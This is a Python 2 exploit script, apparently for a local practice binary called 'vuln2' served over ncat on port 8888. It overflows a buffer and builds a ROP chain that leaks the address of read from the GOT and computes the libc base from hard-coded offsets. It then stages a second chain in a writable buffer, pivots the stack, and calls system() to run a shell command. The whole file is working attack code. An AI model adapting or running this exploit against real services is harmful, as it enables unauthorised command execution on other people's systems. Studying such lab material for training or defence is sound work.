import socket
import struct
import re
import time

# ncat -vc 'LD_LIBRARY_PATH=. ./vuln2' -kl 8888
# python exp2.py

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
sc.connect(('localhost', 8888))

def W(x):
  sc.send(x)

def R():
  return sc.recv(4096)

def PI(x):
  return struct.pack('I', x)

def UI(s):
  return struct.unpack('I', s)[0]

print R()

read_plt = 0x8048360
write_plt = 0x080483a0
main_text = 0x08048517
read_got = 0x804a010
read_offset = 0x000d9d20
gets_offset = 0x00064ae0
system_offset = 0x0003fc40
free_buf = 0x804af00
pop_bx_si_di_bp_ret = 0x80485cc
pop_si_di_bp_ret = 0x80485cc+1
pop_di_bp_ret = 0x80485cc+2
pop_bp_ret = 0x80485cc+3
leave_ret = 0x8048515

W('A'*28+
    PI(write_plt)+PI(pop_si_di_bp_ret)+PI(1)+PI(read_got)+PI(4)+
    PI(read_plt)+PI(pop_si_di_bp_ret)+PI(0)+PI(free_buf)+PI(1000)+
    PI(pop_bp_ret)+PI(free_buf)+PI(leave_ret))


libc_base = UI(R()[0:4]) - read_offset
print 'libc_base = ' + hex(libc_base)

gets_libc = gets_offset + libc_base
system_libc = system_offset + libc_base


W(PI(0) + PI(system_libc) + PI(0) + PI(free_buf+16) + 'ls -la\x00')

print R()
